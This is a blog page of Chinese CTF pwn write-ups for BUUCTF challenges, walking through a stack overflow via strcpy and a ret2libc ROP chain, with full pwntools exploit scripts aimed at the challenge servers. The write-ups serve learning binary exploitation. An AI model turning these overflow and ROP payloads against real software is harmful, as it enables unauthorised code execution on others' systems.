+<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><p>这题我有点不理解</p>
+<p>惯例先checksec一下，发现是32位，且开启了NX（堆栈不可执行）和PIE（地址随机化）保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727111452618.png" alt="image-20210727111452618"></p>
+<p>用IDA打开，查看main函数，发现getshell函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727132643295.png" alt="image-20210727132643295"></p>
+<p>再查看getshell函数，不大理解是个啥意思，触及到知识盲区了</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727132744146.png" alt="image-20210727132744146"></p>
+<p>找了一下大佬的wp，发现直接执行就可以了</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27231</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./shell_asm&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./shell_asm&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727133149442.png" alt="image-20210727133149442"></p>
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><p>先checksec一下，32位，开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727143015132.png" alt="image-20210727143015132"></p>
+<p>用IDA打开，查看main函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727143122701.png" alt="image-20210727143122701"></p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727143140808.png" alt="image-20210727143140808"></p>
+<p>main函数里代码很长，前面都不是重点，先从各个调用的函数开始看起，在GetFlag里找到了一个strpyc函数，strpyc是将src的值复制到dest中，所以strcpy可能存在栈溢出漏洞</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803173838412.png" alt="image-20210727143648100"></p>
+<p>再回到main函数捋一下逻辑</p>
+<p>刚开始是s1在接收administrator，正确之后我们根据AddLog函数中的提示可以得知，我们应该选择1，添加一个log，然后再选择4，去调用GetFlag函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727145023631.png" alt="image-20210727145023631"></p>
+<p>然后开始构造payload，sym读取system地址，再用ROPgadget搜索一下&#x2F;bin&#x2F;sh，最后只搜索到了sh，不过效果是一样的</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210727160122058.png" alt="image-20210727160122058"></p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(shell_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用AddLog()在src上写入payload，再利用GetLog()将src复制到dest中，溢出到ret中</p>
+<p>在csdn上找到一个大佬画的栈图</p>
+<p><img src="C:\Users\HASEE\Desktop\BUUctf\Pwn\ciscn_2019_ne_5.png" alt="ciscn_2019_ne_5"></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29899</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line">system_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">shell_addr=<span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(shell_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input admin password:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;administrator&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0.Exit\n:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input new log info:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0.Exit\n:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="知识补充环节-3"><a href="#知识补充环节-3" class="headerlink" title="知识补充环节"></a>知识补充环节</h3><p><strong>strcpy() 函数的声明</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>参数</strong></p>
+<ul>
+<li><strong>dest</strong> – 指向用于存储复制内容的目标数组。</li>
+<li><strong>src</strong> – 要复制的字符串。</li>
+</ul>
+<p><strong>strcmp() 函数的声明</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp(const char *str1, const char *str2)</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数</strong></p>
+<ul>
+<li><strong>str1</strong> – 要进行比较的第一个字符串。</li>
+<li><strong>str2</strong> – 要进行比较的第二个字符串。</li>
+</ul>
+<p><strong>返回值</strong></p>
+<p>该函数返回值如下：</p>
+<ul>
+<li>如果返回值小于 0，则表示 str1 小于 str2。</li>
+<li>如果返回值大于 0，则表示 str1 大于 str2。</li>
+<li>如果返回值等于 0，则表示 str1 等于 str2。</li>
+</ul>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>先checksec一下，32位，而且开启了NX保护</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803173846868.png" alt="image-20210803173846868">、</p>
+<p>用IDA打开，代码量倒是不大但是没发现什么后门函数之类的，根据题目就在想这会不会是libc泄露。先阅读代码</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803174604887.png" alt="image-20210803174604887"></p>
+<p>重点就是这个vulnerable_function函数</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803174940533.png" alt="image-20210803174940533"></p>
+<p>read的buf长度有256，而参数则是0x88&#x3D;136，可以进行溢出，基本可以确定是泄露libc类型的题目，用read函数或是write函数泄露应该是都可以的，我选择的是用write函数进行泄露</p>
+<p>先是构造第一个payload，去获得write函数的addr为了找到这个libc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br></pre></td></tr></table></figure>
+
+<p>然后找到的地址是 0xf7df56f0</p>
+<p>用网站进行查找，我用的是画箭头的那个，第一个不大清楚为啥用不了，可能版本不对</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803175637527.png" alt="image-20210803175637527"></p>
+<p>算出程序偏移量</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base=write_addr-<span class="number">0x0e56f0</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x03cd10</span></span><br><span class="line">str_bin_sh=libc_base+<span class="number">0x17b8cf</span></span><br></pre></td></tr></table></figure>
+
+<p>构造rop获得shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25366</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_base=write_addr-<span class="number">0x0e56f0</span></span><br><span class="line">system_addr=libc_base+<span class="number">0x03cd10</span></span><br><span class="line">str_bin_sh=libc_base+<span class="number">0x17b8cf</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(str_bin_sh)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>获得flag</p>
+<p><img src="C:\Users\HASEE\AppData\Roaming\Typora\typora-user-images\image-20210803180107438.png" alt="image-20210803180107438"></p>
+<h3 id="知识补充环节-4"><a href="#知识补充环节-4" class="headerlink" title="知识补充环节"></a>知识补充环节</h3><p><strong>write函数的原型</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">void</span>*buf,<span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明：</strong></p>
+<p>fd:是文件描述符（write所对应的是写，即就是1）</p>
+<p>buf:通常是一个字符串，需要写入的字符串</p>
+<p>count：是每次写入的字节数</p>
+<p><strong>read函数的原型</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong></p>
+<p>fd：相应的文件描述符；</p>
+<p>buf：用户给定的数据缓冲区，该缓冲不是固定大小的，由count值决定其大小（用户给定，字节数）</p>
+<p>count：请求读取的字节数（即buf的大小）                            </p>
+
+        <p class="suffix-end">__END__</p>
+        <div class="suffix-box">
+            <div class="suffix-box-left">
+                <img src="/image/tx.JPG" alt="X06">
+            </div>
+            <div class="suffix-box-right">
+                <span class="suffix-box-title">文章作者</span>：X06
+                <br>
+                <span class="suffix-box-title">文章出处</span>：<a href="/2021/11/24/BUU-PWN/" target="_blank">BUU-PWN</a>
+                <br>
+                <span class="suffix-box-title">作者签名</span>：爱意东升西落，浪漫至死不渝
+                <br>
+                <span class="suffix-box-title">关于主题</span>：<a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+                <br>
+                <span class="suffix-box-title">版权声明</span>：文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+                <br>
+            </div>
+            <div style="clear: both;"></div>
+        </div>
+    </div>
+    <div class="article-footer">
+        
+        
+            <div class="tag">
+                标签：
+                
+                    <a href="/tag/pwn/">pwn</a>
+                
+            </div>
+        
+        <div class="article-prev-next">
+            
+                <a href="/2021/11/30/BUU-Re/" class="prev-prefix">« </a> 上一篇：    <a href="/2021/11/30/BUU-Re/" title="发布于 2021-11-30 08:25">BUU-Re</a>
+                <br>
+            
+            
+                <a href="/2021/07/16/PWN-configure%EF%BC%88ubuntu18%EF%BC%89/" class="next-prefix">» </a> 下一篇：    <a href="/2021/07/16/PWN-configure%EF%BC%88ubuntu18%EF%BC%89/" title="发布于 2021-07-16 10:19">PWN configure（ubuntu18）</a>
+            
+        </div>
+    </div>
+    
+    <div class="article-comments">
+        <div class="comments-title">
+            评论列表
+        </div>
+        <div class="comments-content">
+        </div>
+    </div>
+
+</div>
+
+    </div>
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar"></div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span></span></div>        
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul></ul> 
+            </div> 
+            <div class="menu-link"></div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/search.css">
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/iscroll.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/APlayer.css">
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right"></div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : 'X06emmm',
+        GitHubRepositories : 'X06emmm.github.io',
+
+        BlogUser      : 'X06',
+        BlogAvatar    : '/image/tx.JPG',
+        BlogStartDate : '2021-07-14',
+
+        WebsiteTitleBlur         : '(◍´꒳`◍) Hi, Welcome to my blog',
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : '(*´∇｀*) 欢迎回到霍格沃茨!',
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/website/logo.png',
+
+        ProgressBar: {
+            id       : 'topProgressBar',
+            color    : '#77B6FF',
+            height   : '2px',
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound: {
+                tension  : 16,
+                friction : 5
+            },
+            spinner: {
+                id     : 'spinner',
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : '#F0F0F0',
+                    stroke     : '#272633',
+                    base       : '',
+                    child      : '#272633'
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : 'rgba(255, 255, 255, .2)',
+            clearOffset : 0.3
+        },
+
+        ArticleHeaderAnimationRendered : false,
+        ArticleHeaderAnimation         : {
+            triW                  : 14,
+            triH                  : 20,
+            neighbours            : [
+                
+                    'side',
+                
+                    'top',
+                
+                    'bottom',
+                
+            ],
+            speedTrailAppear      : 0.1,
+            speedTrailDisappear   : 0.1,
+            speedTriOpen          : 1,
+            trailMaxLength        : 30,
+            trailIntervalCreation : 100,
+            delayBeforeDisappear  : 2,
+            colors                : [
+                
+                    '#96EDA6',
+                
+                    '#5BC6A9',
+                
+                    '#38668C',
+                
+                    '#374D84',
+                
+                    '#BED5CB',
+                
+                    '#62ADC6',
+                
+                    '#8EE5DE',
+                
+                    '#304E7B',
+                
+            ]
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : '60%',
+            colorBrightness  : '50%',
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : 'random',
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                '/image/hgwc.png',
+            
+                '/image/she.jpg',
+            
+        ],
+        HomeBannerText  : '等太阳落山，就一起做梦',
+
+        ArticleHeaderImage : [
+            
+                'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/header/article.jpg',
+            
+        ],
+
+        OtherBannerText : '你一定能够成为你想要去成为的人',
+
+        MenuList : [
+            
+                {
+                    name   : '首页',
+                    href   : '/',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '标签',
+                    href   : '/tag',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '分类',
+                    href   : '/category',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '归档',
+                    href   : '/archive',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '赞赏',
+                    href   : '/donate',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '关于',
+                    href   : '/about',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '订阅',
+                    href   : '/atom.xml',    
+                    target : '_blank',
+                    class  : ''
+                },
+            
+                {
+                    name   : '搜索',
+                    href   : '',    
+                    target : '',
+                    class  : 'search'
+                },
+            
+                {
+                    name   : '留言板',
+                    href   : '/comment',    
+                    target : '',
+                    class  : ''
+                },
+            
+                {
+                    name   : '友情链接',
+                    href   : '/friend',    
+                    target : '',
+                    class  : ''
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        icon : 'icon-weibo', 
+                        url  : 'https://weibo.com/u/3199224843'
+                    },
+                
+                    {
+                        icon : 'icon-wechat', 
+                        url  : 'https://u.wechat.com/EDrxqboPxE5-6NrOobNDNwI'
+                    },
+                
+                    {
+                        icon : 'icon-qq', 
+                        url  : ''
+                    },
+                
+                    {
+                        icon : 'icon-github', 
+                        url  : 'https://github.com/X06emmm'
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : {
+            icon    : 'like-fill',
+            left    : '爱意东升西落',
+            right   : '浪漫至死不渝'
+        },
+        ThemeInfo   : true,
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                'Based on cnblogs theme SimpleMemory.',
+                            
+                                '',
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                'SimpleMemory Author:',
+                            
+                                'BNDong',
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                'Theme:',
+                            
+                                'LiveForCode',
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : '',
+
+        Donate : {
+            paypal  : '',
+            bitcoin : '',
+            alipay  : '/image/zfb.JPG',
+            wechat  : '/image/wechat.jpg'
+        },
+
+        Code : {
+            style : 'normal'
+        },  
+
+        Search : {
+            applicationID : 'VI4FR31IM5',
+            apiKey        : '3314a8bcb688d0eef926d11b0412c8ef',
+            indexName     : 'abc',
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : '搜索',
+                empty       : '未发现与 「${query}」 相关的内容',
+                stats       : '${hits} 条相关条目，使用了 ${time} 毫秒',
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : '.comments-content',
+            appId          : 'O8XdEwFSobGoow13EApTlL5P-gzGzoHsz',
+            appKey         : '2ntSkK2Yha7D9BBVG88AtBBz',
+            placeholder    : '看春风不喜....',
+            avatar         : 'mm',
+            meta           : 'nick,mail,link',
+            requiredFields : 'nick,mail',
+            pageSize       : 5,
+            lang           : 'zh-cn',
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : '.toc',
+            contentSelector       : '.article-body',
+            headingSelector       : 'h1, h2, h3, h4, h5',
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : '.toc',
+            positionFixedClass    : 'toc-fixed',
+            fixedSidebarOffset    : '',
+        },
+
+        Require : {
+            baseUrl     : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/',
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : 'Meting'
+        },
+        APlayer : {
+            container : '.aplayer',
+            fixed     : true,
+            autoplay  : false,
+            loop      : 'all',
+            order     : 'random',
+            preload   : 'auto',
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : 'aLIEz',
+                        artist : 'mizuki（瑞葵）',
+                        cover  : '/music/cover/aLIEz.jpg',
+                        url    : '/music/song/aLIEz.mp3',
+                        lrc    : '/music/lrc/aLIEz.lrc'
+                    },
+                
+                    {
+                        name   : 'Endless Tears',
+                        artist : 'CLIFF EDGE',
+                        cover  : '/music/cover/Endless Tears.jpg',
+                        url    : '/music/song/Endless Tears.mp3',
+                        lrc    : '/music/lrc/Endless Tears.lrc'
+                    },
+                
+                    {
+                        name   : 'Miracle',
+                        artist : 'Cascada',
+                        cover  : '/music/cover/Miracle.jpg',
+                        url    : '/music/song/Miracle.mp3',
+                        lrc    : '/music/lrc/Miracle.lrc'
+                    },
+                
+                    {
+                        name   : 'Roll The Dice',
+                        artist : '高珊',
+                        cover  : '/music/cover/Roll The Dice.jpg',
+                        url    : '/music/song/Roll The Dice.mp3',
+                        lrc    : '/music/lrc/Roll The Dice.lrc'
+                    },
+                
+                    {
+                        name   : 'See You Again',
+                        artist : 'Charlie Puth, Wiz Khalifa',
+                        cover  : '/music/cover/See You Again.jpg',
+                        url    : '/music/song/See You Again.mp3',
+                        lrc    : '/music/lrc/See You Again.lrc'
+                    },
+                
+                    {
+                        name   : 'Traveling Light',
+                        artist : 'Joel Hanson, Sara Groves',
+                        cover  : '/music/cover/Traveling Light.jpg',
+                        url    : '/music/song/Traveling Light.mp3',
+                        lrc    : '/music/lrc/Traveling Light.lrc'
+                    },
+                
+                    {
+                        name   : '痴心绝对',
+                        artist : '李圣杰',
+                        cover  : '/music/cover/痴心绝对.jpg',
+                        url    : '/music/song/痴心绝对.mp3',
+                        lrc    : '/music/lrc/痴心绝对.lrc'
+                    },
+                
+                    {
+                        name   : '好想大声说爱你',
+                        artist : 'BAAD（バード）',
+                        cover  : '/music/cover/好想大声说爱你.jpg',
+                        url    : '/music/song/好想大声说爱你.mp3',
+                        lrc    : '/music/lrc/好想大声说爱你.lrc'
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : '3778678', 
+            lrcshow  : false, 
+            server   : 'netease', 
+            type     : 'playlist', 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : 'all', 
+            order    : 'random', 
+            preload  : 'auto', 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        LazyLoad : {
+            default : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/image/website/lazyload.svg'
+        },
+  
+        Style : {
+            aplayer          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/APlayer.css',
+            archive          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/archive.css',
+            donate           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/donate.css',
+            fancybox         : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/jquery.fancybox.css',
+            footer           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/footer.css',
+            iconfont         : 'https://at.alicdn.com/t/font_1546312_l3yohatebw.css',
+            index            : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/index.css',
+            menuBubble       : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/menu-bubble.css',
+            page             : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/page.css',
+            post             : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/post.css',
+            search           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/search.css',
+            tocbot           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/tocbot.css',
+            normal           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/normal.css',
+            night            : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/night.css',
+            clipboard        : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/css/clipboard.css'
+        },
+
+        Script: {
+            aplayer          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/APlayer.min.js',
+            config           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/require.config.js',
+            index            : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/index.js',
+            instantSearch    : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/instantsearch.min.js',
+            jQuery           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/jquery-3.4.1.min.js',
+            loading          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/loading.js',
+            meting           : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/Meting.min.js',
+            iscroll          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/iscroll.js',
+            require          : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/require.min.js'
+        },
+
+        Font: {
+            LongCang   : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/LongCang.css',
+            Monda      : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Monda.css',
